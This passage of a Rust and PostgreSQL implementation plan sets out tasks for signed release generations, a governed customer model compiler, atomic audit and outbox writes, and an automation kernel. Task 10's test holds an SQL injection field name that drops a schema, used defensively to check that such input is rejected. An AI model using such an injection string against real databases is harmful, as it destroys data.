git add -- crates/platform/authz/src/grant.rs crates/platform/authz/src/delegation.rs crates/platform/authz/tests/dynamic_grants.rs crates/foundation/src/capability.rs crates/foundation/src/principal.rs crates/platform/authz/src/types.rs
git add -- crates/platform/authz/src/decider.rs crates/platform/authz/src/snapshot.rs crates/platform/authz/src/lib.rs crates/platform/authz/Cargo.toml crates/adapter/db-pg/src/platform_authz/capability_grants.rs crates/adapter/db-pg/src/platform_authz/delegations.rs
git add -- crates/adapter/db-pg/src/platform_authz/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml crates/platform/command/src/pipeline.rs apps/core-server/src/wiring/command.rs apps/core-server/src/wiring/authz.rs
git add -- apps/core-server/Cargo.toml db/migrations/platform_authz/V20261025091900__platform_authz_create_capability_grants.sql db/migrations/platform_authz/V20261025092000__platform_authz_create_delegations.sql testkit/tests/f57_authz_matrix.rs testkit/tests/f57_write_path_authz.rs testkit/Cargo.toml
git commit -m "feat: add dynamic capability authorization"
```

### Task 9: Implement cryptographically signed generations and desired/observed reconciliation

**Files:**
- Create: `crates/platform/release/src/generation.rs`
- Create: `crates/platform/release/src/reconcile.rs`
- Create: `crates/platform/release/tests/generation.rs`
- Modify: `crates/platform/release/src/lib.rs`
- Modify: `crates/platform/release/src/port/config_item.rs`
- Modify: `crates/platform/release/Cargo.toml`
- Modify: `apps/core-server/src/wiring/release.rs`
- Modify: `apps/job-worker/src/wiring/release.rs`
- Modify: `apps/core-server/Cargo.toml`
- Modify: `apps/job-worker/Cargo.toml`
- Modify: `crates/platform/command/src/pipeline.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/release_generations.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_meta/V20261025092100__platform_meta_create_release_generations.sql`
- Create: `testkit/tests/f57_generation_faults.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 2 deployment identity/trusted clock, Task 8 opaque policy-version digest and the existing `ConfigItemApplier` registry.
- Produces: `GenerationId`, `SignedGenerationPayloadV1`、`SignedBusinessArtifactV1<SignedGenerationPayloadV1>`, `ActivationPlan`, `ObservedGeneration`, `GenerationCoordinator::reconcile` and a generation pin stored on every command/workflow record.

- [ ] **Step 1: Write failing atomicity and rollback tests**

```rust
#[tokio::test]
async fn partially_applied_generation_never_becomes_observed() {
    let mut appliers = appliers().fail_on("UI_SCHEMA");
    let result = coordinator(&mut appliers).activate(generation(7)).await;
    assert_eq!(result, Err(ActivationError::ApplyFailed { item: "UI_SCHEMA".into() }));
    assert_eq!(coordinator(&mut appliers).observed(), GenerationId(6));
    assert!(appliers.all_reverted_to(GenerationId(6)));
}

#[test]
fn signature_and_compatibility_are_checked_before_drain() {
    let plan = ActivationPlan::compile(tampered_generation(), runtime_contracts());
    assert_eq!(plan, Err(CompileError::SignatureInvalid));
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-09 --phase pre-red && cargo test -p ep-platform-release --test generation`

Expected: FAIL because generation types and coordinator are missing.

- [ ] **Step 3: Implement the exact state machine**

```rust
#[derive(Clone, Copy, Eq, PartialEq, Ord, PartialOrd)]
pub struct GenerationId(pub u64);

pub enum GenerationState { Draft, Compiled, Simulated, Approved, Signed, Predownloaded, Activating, Observed, RollingBack, RolledBack, Rejected }

pub enum SwapGrade { AtomicGeneration, DrainAndSwap, MaintenanceWindow }

pub struct ActivationPlan {
    pub from: GenerationId,
    pub to: GenerationId,
    pub ordered_items: Vec<PlannedItem>,
    pub required_grade: SwapGrade,
    pub rollback_digest: [u8; 32],
}
```

`SignedGeneration` is only a type alias for `SignedBusinessArtifactV1<SignedGenerationPayloadV1>` and reuses Task 2/F-56 strict JSON、RFC 8785 JCS、`payload_sha256`、detached CMS、SPKI signer token、purpose separation、fixed release root、offline chain/full-CRL and closed ECDSA-P256/RSA-PSS profiles；there is no `algorithm`、free `signing_key_id`、raw signature or trust-chain digest alternative. `SignedGenerationPayloadV1` exact fields are `schema_version=1,purpose="EP-F57-SIGNED-GENERATION-V1",deployment_id,generation,parent_generation,policy_digest,package_set_digest,provider_set_digest,workflow_set_digest,ui_schema_set_digest,client_compatibility_digest,items,rollback_plan_digest,issued_at,not_before,expires_at`。`generation` is positive and greater than `parent_generation` except the signed genesis whose parent is 0；all digests are 64 lowerhex and expiry is finite.

Implement Design §5.1 as the exact closed graph: `DRAFT→COMPILED|REJECTED`、`COMPILED→SIMULATED|REJECTED`、`SIMULATED→APPROVED|REJECTED`、`APPROVED→SIGNED|REJECTED`、`SIGNED→PREDOWNLOADED|REJECTED`、`PREDOWNLOADED→ACTIVATING|REJECTED`、`ACTIVATING→OBSERVED|ROLLING_BACK`、`OBSERVED→ROLLING_BACK`、`ROLLING_BACK→ROLLED_BACK`; every unlisted edge fails and REJECTED/ROLLED_BACK are terminal. Compilation and deterministic simulation are distinct persisted stages with digest-bound evidence; approval cannot skip simulation. Revision always creates a new GenerationId. OBSERVED is successful-history state, while the separate observed pointer identifies the current authority generation.

Each `GenerationItemV1` exact fields are `item_kind,item_id,item_version,payload_digest,owner_code,activation_order,swap_grade,compatibility_digest`；`item_kind` comes only from the signed item-kind registry, `swap_grade` is `ATOMIC_GENERATION|DRAIN_AND_SWAP|MAINTENANCE_WINDOW`, and items sort uniquely by `(activation_order,item_kind,item_id)`。Package/provider/workflow/UI/client sets are recomputed from these exact items and must equal the five set digests；an orphan, duplicate, hidden item or digest mismatch fails before drain. UI schema is a `UI_SCHEMA` item whose canonical payload is distributed with the generation and verified against `payload_digest`/`ui_schema_set_digest`; it does not invent a second free-form signature grammar. `verify(&dyn SignatureVerifier)` must succeed before compilation or drain. A digest alone is not a signature. Only one activation mutex exists per deployment. Persist desired and observed separately; desired may change on ACTIVATING but observed remains the previous generation until every item and post-activation probe succeeds in the atomic observed commit. A rollback uses the signed `rollback_plan_digest` and recorded reverse plan, not a freshly compiled best effort. Old clients may read compatible projections but high-risk commands fail closed on generation mismatch.

Crash convergence is deterministic: before ACTIVATING, restart resumes the committed stage without inventing an edge；in ACTIVATING, exact journal/readback/digests plus passing probes converge to OBSERVED, otherwise transition to ROLLING_BACK；in ROLLING_BACK, restart resumes the same signed reverse plan until the previous OBSERVED pointer is restored and only then marks the failed target ROLLED_BACK. An unresolved rollback remains ROLLING_BACK, opens a blocking incident and rejects new authority writes; it never reports the target or a mixed state observed. Rolling back an already OBSERVED canary uses the same path, and a ROLLED_BACK/REJECTED generation cannot be reactivated.

Keep the crate DAG acyclic: release depends only on foundation/release ports; it receives an opaque policy digest and never imports `ep-platform-authz` or `ep-platform-package`. Authz may inspect a release generation through a foundation type. Inject `GenerationPort` into Task 6's command pipeline so every accepted write pins the verified observed generation.

- [ ] **Step 4: Run crash-point fault injection**

Run: `cargo test -p ep-testkit --test f57_generation_faults -- --nocapture`

Expected: PASS for every allowed GenerationState edge and every unlisted/terminal negative, plus crashes before drain, after drain, after schema, after package swap, before observed commit and during rollback. Exact completed target+journal+probes converges to target OBSERVED；all other ACTIVATING cases converge through ROLLING_BACK to previous observed + target ROLLED_BACK；rollback failure remains ROLLING_BACK with writes blocked, never a mixed state.

- [ ] **Step 5: Run release and architecture gates**

Run: `cargo test -p ep-platform-release -p ep-adapter-db-pg -p core-server -p job-worker -p ep-testkit && cargo xtask archcheck && cargo xtask f57check --task F57-09 --phase post-green`

Expected: PASS and every authoritative command fixture contains deployment, generation, policy, workflow, package, client and idempotency versions.

- [ ] **Step 6: Commit**

```bash
git add -- crates/platform/release/src/generation.rs crates/platform/release/src/reconcile.rs crates/platform/release/tests/generation.rs crates/platform/release/src/lib.rs crates/platform/release/src/port/config_item.rs crates/platform/release/Cargo.toml
git add -- apps/core-server/src/wiring/release.rs apps/job-worker/src/wiring/release.rs apps/core-server/Cargo.toml apps/job-worker/Cargo.toml crates/platform/command/src/pipeline.rs crates/adapter/db-pg/src/platform_meta/release_generations.rs
git add -- crates/adapter/db-pg/src/platform_meta/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml db/migrations/platform_meta/V20261025092100__platform_meta_create_release_generations.sql testkit/tests/f57_generation_faults.rs testkit/Cargo.toml
git commit -m "feat: add atomic signed generations"
```

### Task 10: Compile signed customer relational models without touching protected core tables

**Files:**
- Create: `crates/platform/meta/src/model.rs`
- Create: `crates/platform/meta/src/compiler.rs`
- Create: `crates/platform/meta/src/plan.rs`
- Create: `crates/platform/meta/tests/model_compiler.rs`
- Modify: `crates/platform/meta/src/lib.rs`
- Modify: `crates/platform/meta/src/custom.rs`
- Modify: `crates/platform/meta/src/ddl.rs`
- Modify: `crates/platform/meta/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_meta/model_store.rs`
- Create: `crates/adapter/db-pg/src/platform_meta/plan_executor.rs`
- Modify: `crates/adapter/db-pg/src/platform_meta/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_meta/V20261025092200__platform_meta_create_customer_model_specs.sql`
- Create: `testkit/tests/f57_model_migration_faults.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 9 `GenerationId`/signature verifier, existing `ObjectCode`, `TargetSchema` and conservative DDL classifier.
- Produces: `CustomerModelSpecV1`, `ModelCompiler::compile`, `SignedMigrationPlan`, `ImpactReport` and `ModelPlanExecutor`; a plan can target only generated `ext` tables or approved customer-owned schemas.

- [ ] **Step 1: Write failing protected-zone and injection tests**

```rust
#[test]
fn compiler_rejects_core_table_mutation_even_for_signed_admin_input() {
    let spec = model_spec().entity("customer_extension").physical_target("crm.customers");
    let err = ModelCompiler::default().compile(&spec).unwrap_err();
    assert_eq!(err, CompileError::ProtectedSchema { schema: "crm".into() });
}

#[test]
fn identifiers_are_derived_not_interpolated() {
    let spec = model_spec().field("name); drop schema crm; --", FieldKind::Text);
    assert!(matches!(ModelCompiler::default().compile(&spec), Err(CompileError::InvalidCode { .. })));
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-10 --phase pre-red && cargo test -p ep-platform-meta --test model_compiler`

Expected: FAIL because the model compiler contract is absent.

- [ ] **Step 3: Implement the versioned model and compiler output**

```rust
#[derive(Clone, serde::Serialize, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CustomerModelSpecV1 {
    pub model_id: uuid::Uuid,
    pub legal_entity_id: uuid::Uuid,
    pub version: u32,
    pub entities: Vec<EntitySpec>,
    pub relations: Vec<RelationSpec>,
}

pub struct SignedMigrationPlan {
    pub generation: GenerationId,
    pub model_id: uuid::Uuid,
    pub from_version: u32,
    pub to_version: u32,
    pub operations: Vec<ValidatedDdlOperation>,
    pub impact: ImpactReport,
    pub rollback: RollbackClass,
    pub digest: [u8; 32],
    pub signing_key_id: String,
    pub signature: Vec<u8>,
}
```

Sign and verify the canonical plan bytes through the same trust port as Task 9; a digest-only plan is rejected. Allowed fields are integer, decimal, float, boolean, string, text, date, timestamp, enum, reference and non-indexed JSON. Every generated table contains legal entity, id, version, audit columns and RLS. Destructive or table-rewrite operations require a maintenance generation; loss-bearing changes require export evidence and cannot be represented as hot swap.

- [ ] **Step 4: Test lock budget, resume and rollback classification**

```rust
#[tokio::test]
async fn interrupted_online_index_build_resumes_without_duplicate_index() {
    let plan = compiled_plan_with_index();
    let store = fault_store().crash_after_checkpoint(2);
    assert!(execute(&plan, &store).await.is_err());
    let evidence = execute(&plan, &store.restarted()).await.unwrap();
    assert_eq!(evidence.completed_operations, plan.operations.len());
    assert_eq!(evidence.duplicate_objects, 0);
}
```

Run: `cargo test -p ep-testkit --test f57_model_migration_faults -- --nocapture`

Expected: PASS for lock timeout, full disk, restart, duplicate delivery, rollback-safe and maintenance-only cases.

- [ ] **Step 5: Run SQL and architecture gates**

Run: `cargo test -p ep-platform-meta -p ep-adapter-db-pg -p ep-testkit && cargo xtask sqlcheck && cargo xtask archcheck && cargo xtask f57check --task F57-10 --phase post-green`

Expected: PASS; no generated statement accepts raw schema/table/column text, and protected schema mutation has no callable path.

- [ ] **Step 6: Commit**

```bash
git add -- crates/platform/meta/src/model.rs crates/platform/meta/src/compiler.rs crates/platform/meta/src/plan.rs crates/platform/meta/tests/model_compiler.rs crates/platform/meta/src/lib.rs crates/platform/meta/src/custom.rs
git add -- crates/platform/meta/src/ddl.rs crates/platform/meta/Cargo.toml crates/adapter/db-pg/src/platform_meta/model_store.rs crates/adapter/db-pg/src/platform_meta/plan_executor.rs crates/adapter/db-pg/src/platform_meta/mod.rs crates/adapter/db-pg/src/lib.rs
git add -- crates/adapter/db-pg/Cargo.toml db/migrations/platform_meta/V20261025092200__platform_meta_create_customer_model_specs.sql testkit/tests/f57_model_migration_faults.rs testkit/Cargo.toml
git commit -m "feat: add governed relational model compiler"
```

### Task 11: Make command receipts, business facts, audit and Outbox atomic

**Files:**
- Modify: `crates/platform/outbox/src/lib.rs`
- Modify: `crates/platform/outbox/src/delivery.rs`
- Modify: `crates/platform/outbox/src/consumption.rs`
- Modify: `crates/platform/outbox/Cargo.toml`
- Modify: `crates/platform/audit/src/lib.rs`
- Modify: `crates/platform/audit/src/chain.rs`
- Modify: `crates/platform/audit/src/segment.rs`
- Modify: `crates/platform/audit/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_msg/outbox.rs`
- Create: `crates/adapter/db-pg/src/platform_msg/inbox.rs`
- Create: `crates/adapter/db-pg/src/platform_msg/dead_letters.rs`
- Modify: `crates/adapter/db-pg/src/platform_msg/mod.rs`
- Create: `crates/adapter/db-pg/src/platform_audit/mod.rs`
- Create: `crates/adapter/db-pg/src/platform_audit/entries.rs`
- Create: `crates/adapter/db-pg/src/platform_audit/segments.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_msg/V20261025092300__platform_msg_create_outbox_inbox_dead_letters.sql`
- Create: `db/migrations/platform_audit/V20261025092400__platform_audit_create_entries_and_segments.sql`
- Modify: `crates/platform/command/src/pipeline.rs`
- Modify: `crates/platform/command/Cargo.toml`
- Create: `apps/core-server/src/wiring/evidence.rs`
- Modify: `apps/core-server/src/wiring/mod.rs`
- Modify: `apps/core-server/src/wiring/command.rs`
- Modify: `apps/core-server/Cargo.toml`
- Create: `testkit/tests/f57_transactional_evidence.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 6 command receipts, Task 8 authorization decision, Task 9 generation pin and Tasks 3–5 transaction-aware repositories.
- Produces: real `PgOutboxStore`, `PgInboxStore`, `PgDeadLetterStore`, `PgAuditEntryStore` and `PgAuditSegmentStore`, all accepting the same `PgTx` used by the business repository.

- [ ] **Step 1: Write the failing real-PostgreSQL crash matrix**

```rust
#[tokio::test]
async fn every_commit_has_exactly_one_receipt_fact_audit_and_outbox() {
    for point in CrashPoint::ALL {
        let db = FreshPgTestContext::from_env()
            .await
            .require_admin_url_absent()
            .require_migrated_through(20261025092400)
            .await;
        db.execute_with_crash(create_customer(), point).await;
        db.restart_pipeline().await;
        assert_eq!(db.atomic_cardinality().await, AtomicCardinality::AllZeroOrAllOne);
    }
}
```

Run: `cargo xtask f57check --task F57-11 --phase pre-red && cargo test -p ep-testkit --test f57_transactional_evidence -- --nocapture`

Expected: FAIL because durable Outbox/audit tables and adapters are absent. This test is never ignored；it accepts only the gate-injected `EP_TEST_DATABASE_URL`, requires `EP_TEST_PG16_ADMIN_URL` to be absent, and never creates、migrates or drops a database.

- [ ] **Step 2: Implement the actual tables and adapters**

Outbox rows carry tenant, aggregate, event type/version, payload digest, generation/policy/package/client versions, attempt/lease state and idempotency key. Inbox deduplicates provider deliveries; dead letters keep immutable attempts and resolution links. Audit entries are append-only canonical JCS facts chained into immutable signed segments. Every table has RLS, legal-entity keys, append-only guards and registry coverage.

- [ ] **Step 3: Wire one transaction coordinator**

`CommandPipeline` opens one `PgTx`, reruns Task 8 authorization, writes/updates business state, immutable fact, command receipt, audit entry and Outbox row, then commits. No nested independent transaction is permitted. Failure in any write rolls back all writes. Outbox delivery occurs only after commit; delivery retry never replays the business handler.

- [ ] **Step 4: Verify real atomicity and module wiring**

Run: `cargo test -p ep-platform-command -p ep-platform-outbox -p ep-platform-audit -p ep-adapter-db-pg -p core-server && cargo test -p ep-testkit --test f57_transactional_evidence -- --nocapture && cargo xtask sqlcheck && cargo xtask archcheck && cargo xtask f57check --task F57-11 --phase post-green`

Expected: PASS for every crash point with all-zero-or-all-one cardinality, zero direct adapter bypass and zero ignored database test.

- [ ] **Step 5: Commit**

```bash
git add -- crates/platform/outbox/src/lib.rs crates/platform/outbox/src/delivery.rs crates/platform/outbox/src/consumption.rs crates/platform/outbox/Cargo.toml crates/platform/audit/src/lib.rs crates/platform/audit/src/chain.rs
git add -- crates/platform/audit/src/segment.rs crates/platform/audit/Cargo.toml crates/adapter/db-pg/src/platform_msg/outbox.rs crates/adapter/db-pg/src/platform_msg/inbox.rs crates/adapter/db-pg/src/platform_msg/dead_letters.rs crates/adapter/db-pg/src/platform_msg/mod.rs
git add -- crates/adapter/db-pg/src/platform_audit/mod.rs crates/adapter/db-pg/src/platform_audit/entries.rs crates/adapter/db-pg/src/platform_audit/segments.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml db/migrations/platform_msg/V20261025092300__platform_msg_create_outbox_inbox_dead_letters.sql
git add -- db/migrations/platform_audit/V20261025092400__platform_audit_create_entries_and_segments.sql crates/platform/command/src/pipeline.rs crates/platform/command/Cargo.toml apps/core-server/src/wiring/evidence.rs apps/core-server/src/wiring/mod.rs apps/core-server/src/wiring/command.rs
git add -- apps/core-server/Cargo.toml testkit/tests/f57_transactional_evidence.rs testkit/Cargo.toml
git commit -m "feat: commit business audit and outbox atomically"
```

### Task 12: Build the durable objective-to-evidence automation kernel

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-business-execution-contract.md`
- Create: `crates/platform/flow/src/closure_registry.rs`
- Create: `crates/platform/flow/src/assignment.rs`
- Create: `crates/platform/flow/src/candidate_query.rs`
- Create: `crates/platform/flow/src/workflow.rs`
- Create: `crates/platform/flow/src/compiler.rs`
- Create: `crates/platform/flow/src/simulator.rs`
- Create: `crates/platform/flow/src/upgrade_policy.rs`
- Create: `crates/platform/flow/src/human_effect_decision.rs`
- Create: `crates/platform/flow/src/objective.rs`
- Create: `crates/platform/flow/src/obligation.rs`
- Create: `crates/platform/flow/src/effect.rs`
- Create: `crates/platform/flow/src/checkpoint.rs`
- Create: `crates/platform/flow/src/engine.rs`
- Create: `crates/platform/flow/tests/durable_cycle.rs`
- Create: `crates/platform/flow/tests/assignment_state.rs`
- Create: `crates/platform/flow/tests/workflow_release.rs`
- Modify: `crates/platform/flow/src/lib.rs`
- Modify: `crates/platform/flow/src/state.rs`
- Modify: `crates/platform/flow/src/step.rs`
- Modify: `crates/platform/flow/src/compensation.rs`
- Modify: `crates/platform/flow/Cargo.toml`
- Modify: `apps/job-worker/src/jobs.rs`
- Create: `apps/job-worker/src/wiring/flow.rs`
- Modify: `apps/job-worker/src/wiring/mod.rs`
- Modify: `apps/job-worker/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_flow/objective_store.rs`
- Create: `crates/adapter/db-pg/src/platform_flow/checkpoint_store.rs`
- Create: `crates/adapter/db-pg/src/platform_flow/assignment_store.rs`
- Create: `crates/adapter/db-pg/src/platform_flow/mod.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `db/migrations/platform_flow/V20261025092500__platform_flow_create_objective_graph.sql`
- Create: `db/migrations/platform_flow/V20261025092600__platform_flow_create_execution_checkpoints.sql`
- Create: `testkit/tests/f57_automation_fault_matrix.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 2 trusted/monotonic clocks, Task 8 runtime authorization, Task 9 generation/version pinning and Task 11 transactional evidence.
- Produces: `Objective`, `Obligation`, `EffectRecord`, `EvidenceRef`, `ClosureDecision`, `ExecutionCheckpoint`, `CandidateQuery`, `WorkItemAssignment`, `WorkflowCompiler/Simulator/UpgradePolicy` and `AutomationEngine::tick`; domain tasks publish typed obligations instead of ad-hoc background jobs or fixed-position routing.

- [ ] **Step 1: Write failing restart, unknown-effect and reopen tests**

```rust
#[tokio::test]
async fn lost_provider_response_is_unknown_not_retried_blindly() {
    let mut engine = fixture_engine().provider_succeeds_then_drops_response();
    engine.tick(run_id()).await.unwrap();
    assert_eq!(engine.effect("send-po").state, EffectState::Unknown);
    assert_eq!(engine.incidents().single().kind, IncidentKind::EffectOutcomeUnknown);
    assert_eq!(engine.provider_calls("send-po"), 1);
}

#[test]
fn upstream_fact_change_reopens_closed_objective() {
    let objective = closed_objective().with_dependency(FactRef::contract_version(4));
    let result = objective.apply(FactChanged::contract_version(5));
    assert_eq!(result.state, ObjectiveState::Open);
    assert_eq!(result.reopen_reason, ReopenReason::DependencyChanged);
}

#[test]
fn assignment_loss_checkpoints_then_re_resolves_without_expanding_scope() {
    let current = accepted_assignment().start_work().unwrap();
    let result = current.on_grant_revoked().unwrap();
    assert_eq!(result.state, AssignmentState::Reassigning);
    assert!(result.checkpoint_ref.is_some());
    assert!(!result.next_query.inherits_session_or_temporary_grant);
}
```

- [ ] **Step 2: Confirm failure**

Run: `cargo xtask f57check --task F57-12 --phase pre-red && cargo test -p ep-platform-flow --test durable_cycle`

Expected: FAIL because objective/effect/checkpoint types are missing.

- [ ] **Step 3: Implement the durable core types**

```rust
pub struct Objective {
    pub id: uuid::Uuid,
    pub kind: ObjectiveKind,
    pub subject: SubjectRef,
    pub state: ObjectiveState,
    pub generation: GenerationId,
    pub definition_version: u32,
    pub obligations: Vec<ObligationId>,
    pub closure_rule: ClosureRule,
}

pub enum EffectState { Prepared, Dispatched, Unknown, Confirmed, FailedNotExecuted, Compensated, Conflicted }

pub enum HumanEffectDecision {
    ConfirmedSucceeded { independent_evidence: EvidenceRef },
    ConfirmedNotExecuted { independent_evidence: EvidenceRef },
    ConfirmedCompensated { compensation_evidence: EvidenceRef },
    UnresolvedContained { incident: IncidentId, residual_risk_approval: ApprovalRef },
}

pub struct ExecutionCheckpoint {
    pub run_id: uuid::Uuid,
    pub sequence: u64,
    pub lease_epoch: u64,
    pub completed_steps: Vec<StepId>,
    pub pending_effects: Vec<EffectId>,
    pub digest: [u8; 32],
}


pub struct ObjectiveDefinitionV1 {
    pub kind: ObjectiveKind,
    pub triggers: &'static [TriggerKind],
    pub obligation_kinds: &'static [ObligationKind],
    pub responsibility_capability: CapabilityId,
    pub effect_kinds: &'static [EffectKind],
    pub evidence_kinds: &'static [EvidenceKind],
    pub closure_rule: ClosureRule,
    pub timeout_policy: TimeoutPolicyId,
    pub compensation_commands: &'static [CommandKind],
    pub termination_rules: &'static [TerminationRule],
    pub reopen_triggers: &'static [TriggerKind],
}

pub struct CandidateQuery {
    pub capability: CapabilityId,
    pub legal_entity_id: LegalEntityId,
    pub object_scope: ScopeRef,
    pub due_at: TrustedUtc,
    pub device_requirements: DeviceRequirements,
    pub sod_exclusions: Vec<PrincipalId>,
}
```

The database transaction that changes an objective also writes obligations, effect intent, checkpoint, assignment attempt, audit and outbox. Implement Business §8.2.1's exact `EffectState` graph and wire/SQL tokens: `PREPARED→DISPATCHED|FAILED_NOT_EXECUTED`; `DISPATCHED→CONFIRMED|FAILED_NOT_EXECUTED|UNKNOWN`; `UNKNOWN→CONFIRMED|FAILED_NOT_EXECUTED|COMPENSATED|CONFLICTED`; `CONFIRMED→COMPENSATED|CONFLICTED`; `FAILED_NOT_EXECUTED→CONFLICTED`; `COMPENSATED→CONFLICTED`; `CONFLICTED` terminal. Every unlisted edge fails. Objective `RECONCILING` owns reconciliation attempts while the effect remains `UNKNOWN`; there is no effect `RECONCILING`. Compensation is a new linked effect and the original cannot become `COMPENSATED` before its confirmed compensation fact. Reject legacy `FAILED_NO_EFFECT`/`FailedNoEffect` and effect `RECONCILING` tokens in serde and DB constraints.

The same owner implements Business §8.1's exact `ObjectiveState` adjacency rather than treating state as an arbitrary workflow label: `OPEN→WAITING|RECONCILING|INCIDENT|CLOSURE_REVIEW|ABANDONED`；`WAITING→OPEN|RECONCILING|INCIDENT|CLOSURE_REVIEW|ABANDONED`；`RECONCILING→OPEN|WAITING|INCIDENT|CLOSURE_REVIEW|ABANDONED`；`INCIDENT→OPEN|WAITING|RECONCILING|CLOSURE_REVIEW|ABANDONED`；`CLOSURE_REVIEW→CLOSED|OPEN|WAITING|RECONCILING|INCIDENT|ABANDONED`；`CLOSED→OPEN|WAITING|RECONCILING|INCIDENT` only through a registered new-cycle `ReopenObjective` fact；`ABANDONED` terminal. Nonterminal recomputation uses the single priority `unresolved external effect→RECONCILING`、`uncontrolled security/integrity/duplicate/conflicting evidence→INCIDENT`、`all closure predicates true→CLOSURE_REVIEW`、`only registered external wait remains→WAITING`、otherwise `OPEN`。Only typed closure approval moves CLOSURE_REVIEW→CLOSED；ABANDONED requires the frozen reason/impact/compensation/approval proof and never erases an obligation/effect. `t_f57_aut_004` executes every allowed edge, every priority collision, all unlisted edges, direct CLOSED mutation, CLOSED reopen without registered fact, old-cycle overwrite and every outgoing ABANDONED attempt；SQL CHECK/trigger、domain transition table and runtime export must exact-equal the same graph.

`Unknown` can only use the four `HumanEffectDecision` variants above. Their serde/SQL wire values are exactly `CONFIRMED_SUCCEEDED`、`CONFIRMED_NOT_EXECUTED`、`CONFIRMED_COMPENSATED` and `UNRESOLVED_CONTAINED`, matching the business contract §9；the former spellings `PROVED_SUCCEEDED`、`PROVED_NOT_EXECUTED`、`COMPENSATION_CONFIRMED` and `CONTAINED_UNRESOLVED` are not aliases and must be rejected by parser and database constraint tests. The first three decisions atomically advance `UNKNOWN` to `CONFIRMED`、`FAILED_NOT_EXECUTED`、`COMPENSATED`; `UnresolvedContained` leaves the effect `UNKNOWN` and records containment. `ConfirmedSucceeded` requires independently verifiable target/provider/bank/signature evidence; `ConfirmedNotExecuted` requires evidence of no effect; `UnresolvedContained` never manufactures success; `ConfirmedCompensated` requires the compensation fact. Risk policy adds reauthentication, maker-checker/SoD and immutable attachments. A later contradictory callback moves the original effect to `CONFLICTED`, preserves both evidence sets and the signed human decision, opens a conflict incident, reopens affected objectives, freezes duplicate dispatch and creates a linked recovery effect; generic retry is forbidden. `t_f57_aut_001`/`t_f57_aut_002` must execute every allowed EffectState edge, reject every unlisted/legacy token and cover late success after FAILED_NOT_EXECUTED plus invalidated compensation after COMPENSATED.

`ClosureRegistry` implements exactly the 15 Business machine rows from §8.2.0、§8.2.1 and §8.2.2.1: trigger、obligations、responsibility capability、permitted effects、evidence、closure、typed timeout policy、compensation、expanded authorized termination rules/guards and reopen. `f57check` strict-parses those Markdown machine tables and inline JCS JSON, exact-compares the runtime registry export and never consumes the adjacent human prose as authority；missing/extra/custom/prose token、unknown model/guard、wrong duration unit/bound、unsorted/duplicate set、empty/nonempty special-case drift or a single global `Closed` predicate fails. `t_f57_aut_001` and `t_f57_aut_004` cover all 15 triggers/closure IDs/reopen sets, every timeout model/action, every termination reason/guard and the Quote/Receivable zero-rule cases. Running instances remain pinned to generation and definition version.

`WorkItemAssignment` implements the complete Business §11 graph: `UNASSIGNED→RESOLVING|CANCELLED`、`RESOLVING→ASSIGNED|ESCALATED_NO_CANDIDATE|CANCELLED`、`ASSIGNED→ACCEPTED|RESOLVING|CANCELLED`、`ACCEPTED→IN_PROGRESS|REASSIGNING|CANCELLED`、`IN_PROGRESS→WAITING|REASSIGNING|COMPLETED|CANCELLED`、`WAITING→IN_PROGRESS|REASSIGNING|COMPLETED|CANCELLED`、`REASSIGNING→ASSIGNED|ESCALATED_NO_CANDIDATE|CANCELLED`、`ESCALATED_NO_CANDIDATE→RESOLVING|CANCELLED`，with COMPLETED/CANCELLED terminal. Each resolution creates an immutable attempt from current capability/scope/device/SoD/SLA data；grant loss after acceptance first writes a checkpoint, blocks effects and re-resolves. No-candidate escalation never broadens access, and neither session/MFA/temporary grant nor endpoint-local drafts transfer. `V20261025092500__platform_flow_create_objective_graph.sql` creates the assignment/query/attempt tables and constraints beside objectives；`assignment_store.rs` is their only adapter path. `t_f57_aut_001` and `t_f57_aut_004` in `f57_automation_fault_matrix.rs` exercise the exact registry and every assignment edge/negative before Task 12 POST_GREEN；Task 21 only reuses this kernel with real service/project handlers.

Objective closure review is a typed specialization of that same assignment graph. For `assignment_kind=OBJECTIVE_CLOSURE_REVIEW` only, completing the work item builds internal `DecideObjectiveClosureV1={objective_id,objective_cycle,expected_objective_version,closure_digest,decision,evidence_refs,source_work_item_id}` with `decision=APPROVE|REJECT`; actor、capability、scope、current assignee、SoD、reauth and generation are rebuilt from server context. In one Task 6 transaction it CAS-validates the current CLOSURE_REVIEW snapshot, records immutable `ObjectiveClosureDecisionRecordedV1={objective_id,objective_cycle,decision,resulting_state,row_version,closure_digest,source_work_item_id,audit_entry_id}`, updates the objective (APPROVE→CLOSED；REJECT→priority recomputation) and completes the work item. Idempotent replay returns the same receipt；stale cycle/version/digest、wrong assignment kind/assignee、SoD violation、direct closure command from a client or partial commit fails. Task 18's `work_item.complete` is the only Employee transport mapping and adds no separate API discriminator.

